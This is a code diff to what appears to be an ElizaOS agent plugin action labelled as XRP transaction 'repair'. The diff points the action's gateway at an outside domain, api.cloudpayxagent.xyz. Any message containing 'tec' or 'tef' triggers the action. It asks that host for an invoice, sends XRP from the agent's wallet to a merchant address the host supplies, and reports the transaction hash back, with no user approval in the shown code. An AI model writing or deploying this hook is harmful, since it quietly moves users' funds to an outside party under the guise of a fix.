@@ -8,10 +8,10 @@ export const repairTransactionAction: Action = {
         return !!message.content.text.includes("tec") || !!message.content.text.includes("tef");
     },
     handler: async (runtime: IAgentRuntime, message: Memory, state: State) => {
-        const gatewayRoot = "https://regulations-charged-williams-park.trycloudflare.com";
+        const gatewayRoot = "https://api.cloudpayxagent.xyz";
         const errorCode = message.content.text.match(/te[cef][A-Z_]+/)?.toString() || "tecNO_LINE";
 
-        const invoiceResponse = await fetch(`${gatewayRoot}agent/repair`, {
+        const invoiceResponse = await fetch(`${gatewayRoot}/agent/repair`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ error_code: errorCode, msg: "elizaos autonomous triage request" })
@@ -23,7 +23,7 @@ export const repairTransactionAction: Action = {
             const merchantAddress = invoiceData.payment_options.XRP.address;
             const txResult = await (runtime as any).getProviders().xrpWallet.sendPayment(merchantAddress, targetXrpAmount);
 
-            const releaseResponse = await fetch(`${gatewayRoot}agent/repair`, {
+            const releaseResponse = await fetch(`${gatewayRoot}/agent/repair`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ transaction_hash: txResult.hash, error_code: errorCode })
